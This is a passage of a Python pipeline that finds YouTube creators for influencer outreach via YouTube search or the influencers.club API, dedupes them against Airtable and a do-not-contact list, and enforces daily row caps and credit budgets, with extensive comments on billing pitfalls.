    This niche's external handles first, then everyone else's — the order the
    10k cap is applied in.

    Why this is not just `sorted()`. The vendor caps `exclude_handles` at 10,000
    (INFLUENCERS_MAX_EXCLUDE_HANDLES) and this base holds 14,337, so ~4,300 are
    dropped from every request. Sorted alphabetically, that is the SAME
    alphabetical tail dropped on every run forever — measured 2026-08-15, the
    cut lands at "pinkkupinsku", and a --test run duly re-bought five creators
    from the o-v range that were already tracked externally.

    A handle only costs anything if THIS niche's query would return it, and the
    Home Theatre tables (12,388 handles) are the ones a Home Theater query can
    re-surface. Ranking them ahead of the 1,949 Lifestyle ones spends the scarce
    slots where re-bills actually happen. Measured effect: Lifestyle Sofa's own
    external handles (1,949) now fit entirely, taking it from ~538 uncovered to
    zero; Home Theater's coverage improves but cannot be complete until the
    exclusion is split across requests or the vendor's persistent list is wired.

    Ties are broken alphabetically so the set stays deterministic — a run's
    exclusions should not depend on dict iteration order.

    `source_hint` is matched case-insensitively as a SUBSTRING of the source
    table name, which is why NICHES carries it explicitly rather than reusing
    the niche name: the tables spell it "Home Theatre" and the niche is "Home
    Theater". An empty or unmatched hint degrades to plain alphabetical order,
    i.e. exactly the old behaviour.
    """
    hint = source_hint.casefold()

    def rank(handle: str) -> tuple[int, str]:
        source = ""
        try:
            source = external_handles[handle] or ""
        except (KeyError, TypeError):
            # A plain set/list of handles carries no source — every entry ranks
            # the same, and the sort degrades to alphabetical. Keeps this usable
            # from tests and from any caller that isn't holding an ExternalIndex.
            pass
        return (0 if hint and hint in source.casefold() else 1, handle)

    return sorted(external_handles, key=rank)


def _discovery_exclude_handles(
    blocklist, external_handles, seen_handles, tracked_handles=(),
    external_source_hint: str = "",
) -> set[str]:
    """
    Assemble the discovery exclude set, PRIORITISED under the 10k cap.

    The order is deliberate, and DO NOT CONTACT comes first because it is the
    exclusion that matters most: a creator on the suppression list is going to
    be dropped by process_candidate's blocklist checkpoints no matter what, so
    any discovery credit spent surfacing them is pure waste — and excluding
    them server-side also means they never appear in results a reviewer sees.
    So the blocklist's handles are never dropped to make room.

    `seen_handles` (creators already examined THIS run) come next, so a later
    round never re-bills an earlier round's candidates.

    `tracked_handles` — this niche's OWN Airtable rows — rank alongside them,
    and closing that gap is why they exist. The niche tables historically stored
    only a Channel ID, which `exclude_handles` cannot use, so every tracked
    creator was returned and BILLED (0.01) every run and then resolved at one
    YouTube unit just to be recognised and discarded. That waste grew with the
    table and never stopped. They are in must_keep rather than the leftover room
    because they are certain re-bills: unlike an external-table handle, which
    MIGHT never be returned by this niche's query, a row in this table came out
    of this query.

    External-table handles fill whatever room is left under the cap, ordered by
    _external_priority so THIS niche's own outreach tables claim the slots
    first — the base holds more handles than the cap allows, so which ones get
    dropped is a real decision and not a tie-break. The ones that don't fit are
    still caught after enrichment by process_candidate's external-handle check
    — at the cost of one channels.list unit each, not a wrong contact.

    The blocklist screening in process_candidate is unchanged and remains the
    authoritative, fail-closed suppression gate (it also matches on email and
    name, which a handle-only exclusion can't). This set is a cost-saver layered
    in front of it, never a replacement for it.
    """
    must_keep = set(blocklist.handles) | set(seen_handles) | set(tracked_handles)
    room = max(0, INFLUENCERS_MAX_EXCLUDE_HANDLES - len(must_keep))
    ranked = _external_priority(external_handles, external_source_hint)
    external = [h for h in ranked if h not in must_keep][:room]
    return must_keep | set(external)


def _run_discovery_rounds(
    niche_name: str,
    table_name: str,
    niche_config: dict,
    discovery,
    globally_tracked_ids: set[str],
    external_handles: ExternalIndex,
    blocklist,
    scraper,
    enricher,
    qualified_headroom: int,
    flagged_headroom: int,
    tracked_handles=(),
) -> dict:
    """
    Fill a niche's daily budget from influencers.club discovery instead of
    search.list. Same refill shape as run_niche's keyword loop, with two
    differences that follow from the source:

      - the round's batch is a target creator COUNT handed to
        discovery.discover() (which paginates the endpoint internally), not a
        batch of keywords, and
      - dedupe is by @handle, because discovery returns a handle rather than a
        channel ID. exclude_handles asks the vendor to withhold creators
        already in the base so they are never returned — and, at 0.01 credits
        each, never billed.

    Returns the same counters run_niche tracks:
    {qualified, flagged, discovered, skipped, pushed_ids}.
    """
    pushed_qualified = 0
    pushed_flagged = 0
    total_discovered = 0
    total_skipped = 0
    pushed_ids: set[str] = set()

    logger.info("Discovery source for '%s': influencers.club creator search.", niche_name)
    # The exclude set is assembled per round (see _discovery_exclude_handles):
    # DO NOT CONTACT handles first and never dropped, then this run's seen
    # handles, then external-table handles filling the 10k cap. The niche
    # tables store a Channel ID, not a handle, so their own rows aren't
    # excluded server-side — the post-enrichment channel_id dedupe below
    # (known_channel_ids) is the backstop for a re-discovered niche-table
    # channel, at the cost of the 1-unit channels.list to resolve it.
    filters = niche_config["discovery_filters"]
    seen_handles: set[str] = set()
    # Creators the vendor already billed us for but that this niche hasn't had
    # the headroom to examine yet. Drained before any new request is issued, so
    # a page bought in round 1 is spent over as many rounds as it takes instead
    # of being re-bought each round.
    backlog: list[dict] = []
    dry = False
    # Counts VENDOR REQUESTS, not loop iterations. A round that only drains the
    # backlog costs nothing, so charging it against the cap would let the cap
    # expire without the niche having spent — the "caps unreachable by
    # construction" failure CLAUDE.md records for the old single-pass loop.
    vendor_requests = 0

    while True:
        # Same "one opportunistic round for flagged once qualified is full"
        # rule as the keyword loop — the flagged budget is a ceiling, never a
        # target, and for a niche whose min_channel_age_months is None it can
        # never fill, so it must not drive the loop.
        if (vendor_requests or backlog) and pushed_qualified >= qualified_headroom:
            break

        rows_wanted = (qualified_headroom - pushed_qualified) + (flagged_headroom - pushed_flagged)
        # Oversized against the gate survival rate, exactly as the keyword
        # loop oversizes its candidate batch; the loop itself is what
        # guarantees the budget fills, so this only affects round count.
        target = max(1, int(rows_wanted * CANDIDATE_OVERSHOOT))

        if len(backlog) < target and not dry:
            if vendor_requests >= DISCOVERY_MAX_ROUNDS:
                logger.warning(
                    "'%s' hit the discovery request cap (%d) — stopping.",
                    niche_name, DISCOVERY_MAX_ROUNDS,
                )
                break
            vendor_requests += 1
            fetched = discovery.discover(
                filters=filters,
                target=target,
                exclude_handles=_discovery_exclude_handles(
                    blocklist, external_handles, seen_handles, tracked_handles,
                    external_source_hint=niche_config.get("external_source_hint", ""),
                ),
                source_label=f"influencers.club discovery ({niche_name})",
            )
            fresh = [c for c in fetched if c["handle"] not in seen_handles]
            # EVERY handle the vendor returned is marked seen, not just the ones
            # this round will examine — the vendor billed for all of them, and
            # anything left out here comes back in the next request's
            # exclude_handles gap and gets billed a second time. This line is
            # the actual fix for the 16-credits-for-one-row run.
            seen_handles.update(c["handle"] for c in fetched)
            backlog.extend(fresh)
            total_discovered += len(fresh)
            if not fresh:
                dry = True
            logger.info(
                "Discovery request for '%s': asked for %d, got %d new candidate(s) "
                "(%d now backlogged).",
                niche_name, target, len(fresh), len(backlog),
            )

        if not backlog:
            logger.info("Discovery is dry for '%s' — stopping.", niche_name)
            break

        # Examine only what there is headroom for. The rest stays backlogged:
        # handing all 50 to push_until_full would trade a bounded money leak for
        # an unbounded YouTube-quota one (~3-13 units per candidate, and
        # push_until_full only stops early when BOTH budgets are full).
        batch, backlog = backlog[:target], backlog[target:]

        counts = push_until_full(
            batch,
            lambda c: process_candidate(
                c, external_handles, blocklist, niche_config, scraper, enricher,
                known_channel_ids=globally_tracked_ids | pushed_ids,
            ),
            table_name,
            qualified_headroom - pushed_qualified,
            flagged_headroom - pushed_flagged,
            flagged_possible=niche_config["min_channel_age_months"] is not None,
        )
        pushed_qualified += counts["qualified"]
        pushed_flagged += counts["flagged"]
        total_skipped += counts["skipped"]
        pushed_ids |= counts["pushed_ids"]

        logger.info(
            "'%s' so far: %d/%d qualified, %d/%d flagged "
            "(%.2f discovery credits, %d request(s), %d backlogged).",
            niche_name, pushed_qualified, qualified_headroom,
            pushed_flagged, flagged_headroom, discovery.credits_spent,
            vendor_requests, len(backlog),
        )

    return {
        "qualified": pushed_qualified,
        "flagged": pushed_flagged,
        "discovered": total_discovered,
        "skipped": total_skipped,
        "pushed_ids": pushed_ids,
    }


def run_niche(
    niche_name: str,
    table_name: str,
    keywords: list[str],
    max_results_per_keyword: int,
    days_back: int,
    globally_tracked_ids: set[str],
    external_handles: ExternalIndex,
    blocklist,
    niche_config: dict,
    scraper,
    enricher=None,
    discovery=None,
) -> tuple[int, int, set[str], bool]:
    """
    Run discovery -> pre-filter -> enrich -> score -> push for one niche's
    table. `globally_tracked_ids` is the base-wide dedupe set (union of
    every niche table's Channel IDs, not just this one) — a candidate
    already tracked in ANY niche's table is skipped here too, so a
    channel is claimed by whichever niche discovers it first rather than
    being trackable in more than one table.

    Returns (discovered_count, processed_count, newly_tracked_ids,
    cap_check_completed) — the caller merges newly_tracked_ids into the
    shared dedupe set so a later niche in the same run also sees channels
    just pushed by this one.

    cap_check_completed is True iff this niche's daily-cap check
    (count_added_today) actually ran and succeeded — regardless of
    whether it turned out the niche was already at cap. It is False when
    the niche was skipped for a reason that says nothing about today's
    cap (no table configured, a misconfigured NICHES entry, or an
    unreadable Airtable count). run() uses this to tell "every niche is
    legitimately full today" (a real no-op) apart from "nothing could be
    checked" (a run that silently did nothing) — see IMPORTANT 3 in the
    fix-wave review.
    """
    if not table_name:
        logger.error(
            "No Airtable table configured for niche '%s' — set the matching env var. Skipping this niche.",
            niche_name,
        )
        return 0, 0, set(), False

    # Read the niche's qualification criteria ONCE, here, rather than
    # indexing niche_config[...] inside process_candidate (which runs
    # once per candidate). Checked with "in" rather than truthiness:
    # min_channel_age_months legitimately holds None for niches with no
    # age requirement (e.g. Lifestyle Sofa), so its presence — not its
    # value — is what a misconfigured NICHES entry would get wrong.
    # Failing fast here means a bad config skips this niche instead of
    # raising a KeyError mid-niche and killing the whole run.
    if "min_avg_views" not in niche_config or "min_channel_age_months" not in niche_config:
        logger.error(
            "Niche '%s' is missing 'min_avg_views' or 'min_channel_age_months' in its NICHES "
            "config — skipping this niche rather than crashing partway through.",
            niche_name,
        )
        return 0, 0, set(), False

    logger.info("=== Niche: %s (table: %s) ===", niche_name, table_name)

    try:
        qualified_today = count_added_today(table_name, QUALIFIED)
        flagged_today = count_added_today(table_name) - qualified_today
    except AirtableReadError as e:
        logger.error("Cannot read today's counts for '%s' (%s) — skipping niche.", niche_name, e)
        return 0, 0, set(), False

    qualified_headroom = max(0, DAILY_QUALIFIED_CAP - qualified_today)
    flagged_headroom = max(0, DAILY_FLAGGED_CAP - flagged_today)
    logger.info(
        "'%s': %d/%d qualified and %d/%d flagged already added today.",
        niche_name, qualified_today, DAILY_QUALIFIED_CAP, flagged_today, DAILY_FLAGGED_CAP,
    )
    if qualified_headroom == 0 and flagged_headroom == 0:
        logger.info("'%s' is already at its daily cap — skipping (no quota spent).", niche_name)
        return 0, 0, set(), True

    # --- Refill loop --------------------------------------------------
    # Discover a batch of keywords, push what survives, and come back for
    # more while the QUALIFIED budget has room and keywords remain (see the
    # loop condition below for why flagged doesn't drive this).
    #
    # This used to be a single pass: discover
    # (headroom * CANDIDATE_OVERSHOOT) candidates once, push, done. That
    # worked while almost every candidate became a row, but the 2026-08
    # criteria change moved the view floor, the video-count floor and the
    # search zone into pre_push_drop_reason() as hard DISCARDS — measured,
    # only ~15% of fresh candidates now survive to be written (18 of 122 on
    # 2026-08-11). So a 40-row budget was handed 60 candidates, produced ~9
    # rows, and stopped with 6 of 9 keywords never searched. The cap was
    # unreachable by construction, and the only symptom was the
    # "finished under its qualified budget" warning below, which reads as
    # "discovery is running dry" — the wrong diagnosis, since the keywords
    # had plenty left.
    #
    # Refilling makes the loop self-correcting in both directions: a bad
    # survival rate keeps searching, and a good one stops early, so quota
    # still tracks what the day's headroom actually needs.
    pushed_qualified = 0
    pushed_flagged = 0
    total_discovered = 0
    total_skipped = 0
    pushed_ids: set[str] = set()

    # Discovery source selection. When an influencers.club key is configured
    # (discovery.enabled) and this niche carries discovery_filters, creator
    # search REPLACES the keyword loop below: it filters on the niche's
    # criteria server-side, so a far larger fraction of what it returns
    # survives the gates than raw YouTube search does. With no key — or a
    # niche without filters — control falls straight through to the keyword
    # loop, so the pipeline still runs when influencers.club is unavailable.
    use_discovery = (
        discovery is not None and discovery.enabled and "discovery_filters" in niche_config
    )
    if use_discovery:
        # This niche's own tracked handles, so the vendor never returns — and
        # never bills for — a creator already in this table. Empty until the
        # "Handle" column exists (see airtable_client.get_tracked_handles), in
        # which case behaviour is exactly as before.
        d = _run_discovery_rounds(
            niche_name, table_name, niche_config, discovery,
            globally_tracked_ids, external_handles, blocklist, scraper, enricher,
            qualified_headroom, flagged_headroom,
            tracked_handles=get_tracked_handles(table_name),
        )
        pushed_qualified = d["qualified"]
        pushed_flagged = d["flagged"]
        total_discovered = d["discovered"]
        total_skipped = d["skipped"]
        pushed_ids = d["pushed_ids"]

    # Local copy — the caller's set is shared across niches and must not be
    # mutated here. Grows with every candidate this niche has ALREADY
    # examined (pushed or dropped), so a later batch never re-enriches a
    # channel an earlier one already paid for. Emptied when discovery already
    # ran, so the keyword loop below is skipped entirely in that mode.
    seen_ids = set(globally_tracked_ids)
    remaining_keywords = [] if use_discovery else list(keywords)
    rounds = 0

    while remaining_keywords:
        # Only the QUALIFIED budget is worth spending another 100-unit
        # search on. The flagged budget is a CEILING, not a target — it
        # exists so a weak discovery day can't crowd the table with
        # below-criteria channels, so flagged rows are written
        # opportunistically as they turn up and never hunted for. Chasing it
        # would also never terminate for a niche that cannot produce one at
        # all: Lifestyle Sofa's min_channel_age_months is None, so qualify()
        # can only ever return "Qualified" there and its flagged budget goes
        # permanently unused (documented, expected). A loop that kept
        # searching until flagged filled would burn every keyword in that
        # niche, every day, for rows that can't exist.
        #
        # Tested after at least one round, so a niche whose qualified budget
        # is already full still gets a single opportunistic pass for flagged.
        if rounds and pushed_qualified >= qualified_headroom:
            break
        rounds += 1

        rows_wanted = (qualified_headroom - pushed_qualified) + (flagged_headroom - pushed_flagged)
        # How many keywords to search this round. Ceiling division, floor of
        # 1, so a small shortfall still searches one keyword rather than
        # zero (which would spin the loop without spending or progressing).
        wanted_candidates = max(1, int(rows_wanted * CANDIDATE_OVERSHOOT))
        batch_size = max(
            1,
            -(-wanted_candidates // max(1, EXPECTED_CANDIDATES_PER_KEYWORD)),
        )
        batch = remaining_keywords[:batch_size]
        remaining_keywords = remaining_keywords[batch_size:]

        logger.info(
            "Discovery round for '%s': %d keyword(s) %s — %d row(s) still wanted.",
            niche_name, len(batch), batch, rows_wanted,
        )
        # target_fresh is deliberately NOT passed: the batch was already
        # sized to the shortfall, and stopping part-way through it would
        # consume keywords from remaining_keywords without searching them.
        discovered = run_discovery(
            batch,
            max_results_per_keyword=max_results_per_keyword,
            days_back=days_back,
            exclude_ids=seen_ids,
        )
        total_discovered += len(discovered)
        logger.info("Discovered %d unique candidate channel(s).", len(discovered))

        # Straight set-membership filter, deliberately not a DataFrame: a
        # round trip through pandas rewrote the candidates on the way out —
        # it appended its own bookkeeping column to every record and filled a
        # NaN wherever one candidate carried a key another lacked (which also
        # promoted that column's ints to floats). Nothing downstream wanted
        # either.
        if not discovered:
            logger.info("No candidates discovered — nothing to process.")
        new_candidates = [c for c in discovered if c["channel_id"] not in seen_ids]

        logger.info(
            "%d candidate(s) already tracked or already examined, %d remaining to process.",
            len(discovered) - len(new_candidates), len(new_candidates),
        )

        counts = push_until_full(
            new_candidates,
            lambda c: process_candidate(
                c, external_handles, blocklist, niche_config, scraper, enricher
            ),
            table_name,
            qualified_headroom - pushed_qualified,
            flagged_headroom - pushed_flagged,
            flagged_possible=niche_config["min_channel_age_months"] is not None,
        )

        pushed_qualified += counts["qualified"]
        pushed_flagged += counts["flagged"]
        total_skipped += counts["skipped"]
        pushed_ids |= counts["pushed_ids"]
        # Every candidate offered to push_until_full is now spent, whether it
        # was written or dropped. push_until_full only returns before reading
        # its whole list when BOTH budgets are full, which also ends this
        # loop — so nothing unexamined is being discarded here.
        seen_ids.update(c["channel_id"] for c in new_candidates)

        logger.info(
            "'%s' so far: %d/%d qualified, %d/%d flagged (%d keyword(s) left).",
            niche_name, pushed_qualified, qualified_headroom,
            pushed_flagged, flagged_headroom, len(remaining_keywords),
        )

    logger.info(
        "'%s': pushed %d qualified, %d flagged, skipped %d.",
        niche_name, pushed_qualified, pushed_flagged, total_skipped,
    )

    if not use_discovery and pushed_qualified < qualified_headroom:
        logger.warning(
            "'%s' finished under its qualified budget (%d of %d) with every keyword "
            "searched. Discovery really is running dry for these keywords — widen "
            "--days-back for a one-off sweep, or add keywords from the brief's "
            "secondary content types.",
            niche_name, pushed_qualified, qualified_headroom,
        )

    return total_discovered, pushed_qualified + pushed_flagged, pushed_ids, True


# A NICHES entry missing any of these crashes run() with a bare KeyError
# (table_name/keywords, indexed directly in run() before run_niche() is
# even called) or run_niche() itself (min_avg_views/min_channel_age_months,
# checked there — see its docstring). Checking all four here, up front,
# means a bad config skips just that niche instead of killing the whole
# run partway through.
REQUIRED_NICHE_KEYS = ("table_name", "keywords", "min_avg_views", "min_channel_age_months")


def run(
    niches: dict,
    max_results_per_keyword: int,
    days_back: int,
    max_discovery_credits=None,
) -> None:
    try:
        blocklist = fetch_blocklist()
    except BlocklistUnavailable as e:
        logger.error("ABORTING: %s", e)
        raise SystemExit(1)

    # Global (base-wide) dedupe: fetched once across every niche's table
    # before any niche runs, so a channel already tracked anywhere in the
    # base — not just in the niche currently being processed — is skipped.
    # get_existing_channel_ids() raises AirtableReadError rather than
    # returning a partial set on a mid-pagination failure (a 429 on page 7
    # of 14, say); a partial set here would make already-tracked channels
    # look fresh and get re-pushed, reverting reviewer Status/Notes (see
    # IMPORTANT 2 in the fix-wave review). Abort the whole run rather than
    # proceed on a set we can't trust, mirroring the blocklist abort above.
    globally_tracked_ids: set[str] = set()
    try:
        for niche_config in niches.values():
            if niche_config.get("table_name"):
                globally_tracked_ids |= get_existing_channel_ids(niche_config["table_name"])
    except AirtableReadError as e:
        logger.error("ABORTING: cannot establish the existing-channel-ID dedupe set (%s).", e)
        raise SystemExit(1)

    # Handles already tracked in the base's other YouTube outreach/leads/
    # influencer tables (see external_dedupe.py) — cached, so this is
    # near-instant on any run within EXTERNAL_CACHE_MAX_AGE_HOURS of the
    # last one.
    external_handles = fetch_external_handles()

    total_discovered = 0
    total_processed = 0
    # Whether ANY niche actually completed its daily-cap check this run
    # (see run_niche()'s cap_check_completed return value). An expired
    # Airtable token, or a NICHES dict where every entry is missing a
    # required key, would otherwise skip every niche and still exit 0 —
    # a daily scheduled job silently doing nothing forever. See IMPORTANT 3.
    any_cap_check_completed = False

    # Email chain step 4. One client per run so the lookup budget and the
    # credit-cap breaker are scoped to the run, and inert when no API key
    # is set — the same soft-disable contract as null_scraper() below.
    enricher = InfluencersClient.from_config()
    # Said out loud for the same reason the browser warning below is. This is
    # the only step that costs money, and from_config() logs only when the key
    # is ABSENT — so a live run was otherwise silent about whether step 4 ran
    # at all, which is indistinguishable from it running and finding nothing.
    if enricher.enabled:
        logger.info("Email chain step 4 is live (influencers.club enrichment).")

    # Discovery source, one client per run so its credit ceiling is run-scoped.
    # Inert when no API key is set, in which case run_niche falls back to the
    # YouTube search.list keyword loop — so the pipeline still runs without it.
    discovery = InfluencerDiscovery.from_config(max_credits=max_discovery_credits)
    if discovery.enabled:
        logger.info("Discovery source: influencers.club creator search (replacing search.list).")
    else:
        logger.info("influencers.club discovery unavailable — discovery falls back to YouTube search.list.")

    scraper = BrowserEmailScraper.launch() if USE_PLAYWRIGHT_STEALTH else null_scraper()
    # launch() fails SOFT — a missing Chromium binary, a missing shared
    # library, or an unimportable playwright all return an inert scraper
    # rather than raising, so the run continues with email chain step 5
    # silently doing nothing. That is the right behaviour (one email source
    # is not worth killing a run over) but it is invisible: the symptom is
    # simply fewer emails, on a metric nobody watches per-run. Say it out
    # loud instead, since "USE_PLAYWRIGHT_STEALTH is set" and "the browser
    # actually started" are different facts and only the second one matters.
    if USE_PLAYWRIGHT_STEALTH and not scraper.enabled:
        logger.warning(
            "USE_PLAYWRIGHT_STEALTH is on but the browser could not start — email "
            "chain step 5 (linked site / contact page) is doing nothing this run. "
            "On CI this usually means the 'Install Chromium for Playwright' step "
            "was skipped; locally, run: python -m playwright install chromium"
        )
    elif USE_PLAYWRIGHT_STEALTH:
        logger.info("Browser email step is live (Playwright + stealth).")

    try:
        for niche_name, niche_config in niches.items():
            missing_keys = [key for key in REQUIRED_NICHE_KEYS if key not in niche_config]
            if missing_keys:
                logger.error(
                    "Niche '%s' is missing required NICHES key(s) %s — skipping this niche "
                    "rather than crashing the whole run.",
                    niche_name, missing_keys,
                )
                continue

            discovered, processed, newly_tracked_ids, cap_check_completed = run_niche(
                niche_name,
                niche_config["table_name"],
                niche_config["keywords"],
                max_results_per_keyword,
                days_back,
                globally_tracked_ids,
                external_handles,
                blocklist,
                niche_config,
                scraper,
                enricher,
                discovery,
            )
            total_discovered += discovered
            total_processed += processed
            any_cap_check_completed = any_cap_check_completed or cap_check_completed
            # So a later niche in this same run also sees channels this one
            # just pushed, rather than only picking up prior runs' state.
            globally_tracked_ids |= newly_tracked_ids
    finally:
        scraper.close()

    quota_used = get_today_spend()
    print("\n--- Run summary ---")
    print(f"Total discovered:  {total_discovered}")
    print(f"Total processed:   {total_processed}")
    print(f"Quota used today:  {quota_used} / {DAILY_QUOTA_BUDGET}")
    # An upper bound on credits, not a count of them: a lookup that found
    # no address was free (see influencers.py). Reported because a credit
    # spend nobody watches per-run is exactly how a budget gets a surprise.
    if enricher.lookups_spent:
        print(
            f"influencers.club:  {enricher.lookups_spent} billable lookup(s), "
            f"{enricher.credits_reported:g} credits reported by the vendor"
        )
    # Discovery credits are the exact figure the vendor billed (credits_cost),
    # not an upper bound — every returned creator is charged, unlike an enrich
    # miss which is free.
    #
    # Reported WITH the creators-billed count and the credits-per-row ratio,
    # because the absolute figure alone hid a 32x waste bug: 16 credits looked
    # unremarkable until it sat next to "1 qualified row". A run that starts
    # buying creators it never examines shows up here as the ratio moving, which
    # is the number to watch.
    if discovery.credits_spent:
        # total_processed is rows actually PUSHED (qualified + flagged), which
        # is the denominator that matters — not candidates examined.
        per_row = (
            f"{discovery.credits_spent / total_processed:.3g}"
            if total_processed else "n/a (no rows)"
        )
        print(
            f"discovery credits: {discovery.credits_spent:g} spent on creator search "
            f"({discovery.creators_billed} creators billed, {per_row} credits/row)"
        )

    if not any_cap_check_completed:
        logger.error(
            "No niche completed its daily-cap check this run — every niche was skipped for "
            "a non-cap reason (missing NICHES config, no table configured, or an unreadable "
            "Airtable count). Exiting non-zero so a scheduled run that did nothing is never "
            "reported as green."
        )
        raise SystemExit(1)


def main() -> None:
    global DAILY_QUALIFIED_CAP, DAILY_FLAGGED_CAP

    parser = argparse.ArgumentParser(description="YouTube channel vetting pipeline")
    parser.add_argument(
        "--test",
        action="store_true",
        help="Run a cheap end-to-end smoke test: 1 keyword, max_results=5, first niche only.",
    )
    parser.add_argument(
        "--daily-cap",
        type=int,
        default=None,
        help=(
            "Override both DAILY_QUALIFIED_CAP and DAILY_FLAGGED_CAP for this run, so the "
            "capping path can be tested cheaply against production Airtable without also "
            "leaving the flagged budget at its full (10/day) size."
        ),
    )
    parser.add_argument(
        "--days-back",
        type=int,
        default=DISCOVERY_DAYS_BACK,
        help="How many days back to search for videos. Defaults to DISCOVERY_DAYS_BACK "
             "(7). Pass a larger value for a one-off backlog sweep, e.g. --days-back 90.",
    )
    args = parser.parse_args()

    if args.daily_cap is not None:
        DAILY_QUALIFIED_CAP = args.daily_cap
        DAILY_FLAGGED_CAP = args.daily_cap

    if args.test:
        # Bound the daily caps too, not just max_results. max_results only
        # limits the search.list FALLBACK path; when influencers.club discovery
        # is active it ignores max_results and fills the daily cap, so without
        # this a --test run would discover, enrich, and push toward a full
        # 30-row day (real credits, real quota, real rows) instead of a cheap
        # smoke test. A caller who wants a specific size can still pass
        # --daily-cap, which takes precedence.
        if args.daily_cap is None:
            DAILY_QUALIFIED_CAP = 2
            DAILY_FLAGGED_CAP = 1
        # The row caps do NOT bound discovery spend — they make it worse, so the
        # credit ceiling has to be passed separately. See
        # INFLUENCERS_TEST_DISCOVERY_CREDITS in config.py for why (a smaller cap
        # shrinks `target` below the vendor's 50-result minimum billable page,
        # so each round buys 50 creators to examine 3). The old version of this
        # log line claimed the caps "bound discovery spend too"; a live --test
        # run spent 16 credits for one row, which is the refutation.
        logger.info(
            "Running in --test mode: first niche only, max_results=5, capped to "
            "%d qualified / %d flagged, discovery ceiling %.2f credits.",
            DAILY_QUALIFIED_CAP, DAILY_FLAGGED_CAP, INFLUENCERS_TEST_DISCOVERY_CREDITS,
        )
        first_niche_name = next(iter(NICHES))
        first_niche = NICHES[first_niche_name]
        test_niches = {first_niche_name: {**first_niche, "keywords": first_niche["keywords"][:1]}}
        run(
            niches=test_niches,
            max_results_per_keyword=5,
            days_back=args.days_back,
            max_discovery_credits=INFLUENCERS_TEST_DISCOVERY_CREDITS,
        )
    else:
        run(niches=NICHES, max_results_per_keyword=50, days_back=args.days_back)


if __name__ == "__main__":
    main()
